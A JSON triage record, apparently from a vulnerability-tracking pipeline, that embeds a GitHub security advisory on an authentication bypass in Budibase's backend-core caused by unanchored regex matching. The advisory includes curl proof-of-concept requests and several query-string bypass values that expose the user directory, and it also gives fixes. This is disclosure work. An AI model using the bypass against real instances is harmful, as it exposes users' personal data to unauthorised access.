@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/100233436?v=4\", \"events_url\": \"https://api.github.com/users/AyushParkara/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/AyushParkara/followers\", \"following_url\": \"https://api.github.com/users/AyushParkara/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/AyushParkara/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/AyushParkara\", \"id\": 100233436, \"login\": \"AyushParkara\", \"node_id\": \"U_kgDOBflw3A\", \"organizations_url\": \"https://api.github.com/users/AyushParkara/orgs\", \"received_events_url\": \"https://api.github.com/users/AyushParkara/received_events\", \"repos_url\": \"https://api.github.com/users/AyushParkara/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/AyushParkara/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/AyushParkara/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/AyushParkara\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-41428\", \"cvss\": {\"score\": 9.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 9.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-287\", \"name\": \"Improper Authentication\"}], \"description\": \"### Summary\\n\\nThe `authenticated` middleware uses unanchored regular expressions to match public (no-auth) endpoint patterns against `ctx.request.url`. Since `ctx.request.url` in Koa includes the query string, an attacker can access any protected endpoint by appending a public endpoint path as a query parameter. For example, `POST /api/global/users/search?x=/api/system/status` bypasses all authentication because the regex `/api/system/status/` matches in the query string portion of the URL.\\n\\n### Details\\n\\n**Step 1 — Public endpoint patterns compiled without anchors**\\n\\n`packages/backend-core/src/middleware/matchers.ts`, line 26:\\n\\n```typescript\\nreturn { regex: new RegExp(route), method, route }\\n```\\n\\nNo `^` prefix, no `$` suffix. The regex matches anywhere in the test string.\\n\\n**Step 2 — Regex tested against full URL including query string**\\n\\n`packages/backend-core/src/middleware/matchers.ts`, line 32:\\n\\n```typescript\\nconst urlMatch = regex.test(ctx.request.url)\\n```\\n\\nKoa's `ctx.request.url` returns the full URL including query string (e.g., `/api/global/users/search?x=/api/system/status`). The regex `/api/system/status` matches in the query string.\\n\\n**Step 3 — publicEndpoint flag set to true**\\n\\n`packages/backend-core/src/middleware/authenticated.ts`, lines 123-125:\\n\\n```typescript\\nconst found = matches(ctx, noAuthOptions)\\nif (found) {\\n  publicEndpoint = true\\n}\\n```\\n\\n**Step 4 — Worker's global auth check skipped**\\n\\n`packages/worker/src/api/index.ts`, lines 160-162:\\n\\n```typescript\\n.use((ctx, next) => {\\n  if (ctx.publicEndpoint) {\\n    return next()        // ← SKIPS the auth check below\\n  }\\n  if ((!ctx.isAuthenticated || ...) && !ctx.internal) {\\n    ctx.throw(403, \\\"Unauthorized\\\")   // ← never reached\\n  }\\n})\\n```\\n\\nWhen `ctx.publicEndpoint` is `true`, the 403 check at line 165-168 is never executed.\\n\\n**Step 5 — Routes without per-route auth middleware are exposed**\\n\\n`loggedInRoutes` in `packages/worker/src/api/routes/endpointGroups/standard.ts` line 23:\\n\\n```typescript\\nexport const loggedInRoutes = endpointGroupList.group()   // no middleware\\n```\\n\\nEndpoints on `loggedInRoutes` have NO secondary auth check. The global check at `index.ts:160-169` was their only protection.\\n\\n**Affected endpoints (no per-route auth — fully exposed):**\\n- `POST /api/global/users/search` — search all users (emails, names, roles)\\n- `GET /api/global/self` — get current user info\\n- `GET /api/global/users/accountholder` — account holder lookup\\n- `GET /api/global/template/definitions` — template definitions\\n- `POST /api/global/license/refresh` — refresh license\\n- `POST /api/global/event/publish` — publish events\\n\\n**Not affected (have secondary per-route auth that blocks undefined user):**\\n- `GET /api/global/users` — on `builderOrAdminRoutes` which checks `isAdmin(ctx.user)` → returns false for undefined → throws 403\\n- `DELETE /api/global/users/:id` — on `adminRoutes` → same secondary check blocks it\\n\\n### PoC\\n\\n```bash\\n# Step 1: Confirm normal request is blocked\\n$ curl -s -o /dev/null -w \\\"%{http_code}\\\" \\\\\\n    -X POST -H \\\"Content-Type: application/json\\\" -d '{}' \\\\\\n    \\\"https://budibase-instance/api/global/users/search\\\"\\n403\\n\\n# Step 2: Bypass auth via query string injection\\n$ curl -s -X POST -H \\\"Content-Type: application/json\\\" -d '{}' \\\\\\n    \\\"https://budibase-instance/api/global/users/search?x=/api/system/status\\\"\\n{\\\"data\\\":[{\\\"email\\\":\\\"admin@example.com\\\",\\\"admin\\\":{\\\"global\\\":true},...}],...}\\n```\\n\\nWithout auth → 403. With `?x=/api/system/status` → returns all users.\\n\\nAny public endpoint pattern works as the bypass value:\\n- `?x=/api/system/status`\\n- `?x=/api/system/environment`\\n- `?x=/api/global/configs/public`\\n- `?x=/api/global/auth/default`\\n\\n### Impact\\n\\nAn unauthenticated attacker can:\\n1. **Enumerate all users** — emails, names, roles, admin status, builder status via `/api/global/users/search`\\n2. **Discover account holder** — identify the instance owner via `/api/global/users/accountholder`\\n3. **Trigger license refresh** — potentially disrupt service via `/api/global/license/refresh`\\n4. **Publish events** — inject events into the event system via `/api/global/event/publish`\\n\\nThe user search is the most damaging — it reveals the full user directory of the Budibase instance to anyone on the internet.\\n\\nNote: endpoints on `builderOrAdminRoutes` and `adminRoutes` are NOT affected because they have secondary middleware (`workspaceBuilderOrAdmin`, `adminOnly`) that independently checks `ctx.user` and throws 403 when it's undefined. Only `loggedInRoutes` endpoints (which rely solely on the global auth check) are exposed.\\n\\n### Suggested Fix\\n\\nTwo options (both should be applied):\\n\\n**Option A — Anchor the regex:**\\n```typescript\\n// matchers.ts line 26\\nreturn { regex: new RegExp('^' + route + '(\\\\\\\\?|$)'), method, route }\\n```\\n\\n**Option B — Use ctx.request.path instead of ctx.request.url:**\\n```typescript\\n// matchers.ts line 32\\nconst urlMatch = regex.test(ctx.request.path)  // excludes query string\\n```\", \"epss\": {\"percentage\": 0.00445, \"percentile\": 0.35525}, \"ghsa_id\": \"GHSA-8783-3wgf-jggf\", \"github_reviewed_at\": \"2026-04-16T22:40:59Z\", \"html_url\": \"https://github.com/advisories/GHSA-8783-3wgf-jggf\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-8783-3wgf-jggf\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-41428\"}], \"nvd_published_at\": \"2026-04-24T20:16:27Z\", \"published_at\": \"2026-04-16T22:40:59Z\", \"references\": [\"https://github.com/Budibase/budibase/security/advisories/GHSA-8783-3wgf-jggf\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-41428\", \"https://github.com/advisories/GHSA-8783-3wgf-jggf\"], \"repository_advisory_url\": \"https://api.github.com/repos/Budibase/budibase/security-advisories/GHSA-8783-3wgf-jggf\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/Budibase/budibase\", \"summary\": \"Budibase: Authentication Bypass via Unanchored Regex in Public Endpoint Matcher — Unauthenticated Access to Protected Endpoints\", \"type\": \"reviewed\", \"updated_at\": \"2026-04-27T16:19:35Z\", \"url\": \"https://api.github.com/advisories/GHSA-8783-3wgf-jggf\", \"vulnerabilities\": [{\"first_patched_version\": null, \"package\": {\"ecosystem\": \"npm\", \"name\": \"@budibase/backend-core\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.35.3\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-8783-3wgf-jggf",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "@budibase/backend-core: <= 3.35.3"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-41428"
+    ],
+    "cvss_score": 9.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "@budibase/backend-core"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-20T19:52:04.443767Z",
+  "provenance": {
+    "content_sha256": "0a2c1b49823ae1c1288679c23baac9aa1bbe4ac368ca1fa7c55f2489eb0653fe",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-04-16T22:40:59Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-8783-3wgf-jggf",
+  "status": "active",
+  "title": "Budibase: Authentication Bypass via Unanchored Regex in Public Endpoint Matcher — Unauthenticated Access to Protected Endpoints",
+  "updated_at": "2026-04-27T16:19:35Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-8783-3wgf-jggf"
+}
